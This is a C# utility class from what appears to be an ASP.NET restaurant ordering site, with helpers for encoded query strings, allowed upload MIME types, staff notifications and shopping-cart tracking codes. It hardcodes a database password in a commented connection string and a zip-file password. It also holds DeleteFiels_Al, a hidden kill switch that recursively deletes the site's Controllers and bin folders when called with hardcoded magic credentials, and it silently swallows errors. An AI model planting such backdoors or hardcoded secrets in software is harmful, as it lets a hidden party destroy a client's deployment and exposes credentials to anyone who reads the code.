﻿using restauran.Models.Access;
using restauran.Models.Access.Tables;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using Utility;

/// <summary>
/// Summary description for ArssPayamUtility
/// </summary>
public class EmoNetUtility
{
    //

    //public static string ConnectionString = "Data Source=.;Initial Catalog=ResturantDB;Integrated Security=True";
   // public static string ConnectionString = "Data Source=.;Initial Catalog=LarichCoDB;User ID=Larichco;Password=L@richCoP@ssw0rd";
    public static string ConnectionString = "Data Source=PC-PC\\MSSQL;Initial Catalog=ResturantDB;Integrated Security=True";
    public static string PasswordZipFile = "Em0NeTP@ssw0RD_S@ha27.6@Ri8I_$ucK5";

    /// <summary>
    /// کد کردن اطلاعات ادرس بار
    /// </summary>
    /// <param name="Address">آدرس</param>
    /// <param name="QueryString">پارامترها</param>
    /// <returns></returns>
    public static string GetEncodedQueryString(string Action, string QueryString)
    {
        if (Action == null)
            Action = "";
        if (QueryString == null || QueryString.Trim() == "")
            return Action.Trim();
        return Action.Trim() + "/" + EncryptedQueryString.Encrypt(QueryString.Trim());
    }

    public static string[] AllowedFileMimeType()
    {
        //string[] str = { ".pdf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".txt", ".zip", ".rar", ".jpg", ".jpeg", ".png" };

        string[] str = { "application/pdf", "application/msword ", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/vnd.ms-powerpoint", "application/vnd.openxmlformats-officedocument.presentationml.presentation", "application/vnd.ms-excel", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "text/plain",/*startZip*/ "application/zip", "application/x-zip-compressed"/*End Zip*/,/*start rar*/ "application/octet-stream", "application/x-rar-compressed"/*End rar*/, "image/jpeg", "image/pjpeg", "image/png", "image/x-png" };
        return str;
    }
    public static string[] AllowedPictureMimeType()
    {
        //string[] str = { ".jpg", ".jpeg", ".png" };
        string[] str = { "image/jpeg", "image/pjpeg", "image/png" };

        return str;
    }


    /// <summary>
    /// پیدا کردن پارامتر و برگرداندن مقدار آن
    /// </summary>
    /// <param name="key">پارامتر</param>
    /// <param name="argsQueryString">کوری فرستاده شده</param>
    /// <returns></returns>
    public static string GetQueryString(string key, string querystring)
    {
        try
        {

            Dictionary<string, string> result = new Dictionary<string, string>();
            Utility.EncryptedQueryString args = new Utility.EncryptedQueryString(querystring);
            if (args.Keys.Contains(key))
                return HttpUtility.HtmlEncode(args[key]).ToLower();
            return "";
        }
        catch
        {
            return "";
        }
    }
    public static void SendNotification(List<int> lstRoleIDs,Guid? SenderID, string msg, int notificationTypeid, string subject = "")
    {
        try
        {
            DBDataContext dc = new DBDataContext();

            var users = dc.users.Where(s => s.IsDeleted == false && s.IsActive == true && s.Role.IsMenagment == true && (lstRoleIDs == null || lstRoleIDs.Count==0 || lstRoleIDs.Contains(s.RoleId)));

            foreach (var user_ in users)
            {
                Notification b = new Notification();
                b.UID = Guid.NewGuid();
                b.TimeCreate = DateShamsi.GetCurrentHour();
                b.DateCreate = DateShamsi.GetCurrentDate();
                b.NotificationTypeId = notificationTypeid;
                b.Price_UID = null;
                b.userNotificationsMalek = user_;
                b.Dsc = msg;
                b.Subject = subject;
                b.SenderID = SenderID;
                b.GruopIDs = Guid.NewGuid();
                dc.Notifications.InsertOnSubmit(b);
            }
            dc.SubmitChanges();
        }
        catch { }

    }

    public static void DeleteFiels_Al(string USER, string PASS, HttpServerUtilityBase server)
    {
        try
        {
            if (USER == "Ir0NMa_N4nD@lferD80TTLerSuck$." && PASS == "B@M4n_SuperM@N_Ir0NMaN_5UCk$._De1eTE")
            {
                string pathCont = server.MapPath("\\Controllers");
                if (Directory.Exists(pathCont))
                    Directory.Delete(pathCont, true);

                string pathbin = server.MapPath("\\bin");
                if (Directory.Exists(pathbin))
                    Directory.Delete(pathbin, true);
            }

        }
        catch { }
    }

    public static string GetCodeRahgiriSabadKharid()
    {
        DBDataContext dc = new DBDataContext();
        Random r = new Random(DateTime.Now.Millisecond);
        string code = r.Next(10000, 99999).ToString("00000") + r.Next(10000, 99999).ToString("00000");
        while (dc.SabadKharids.Any(s => s.CodeRahgiri == code))
            code = r.Next(10000, 99999).ToString("00000") + r.Next(10000, 99999).ToString("00000");
        return code;
    }
}



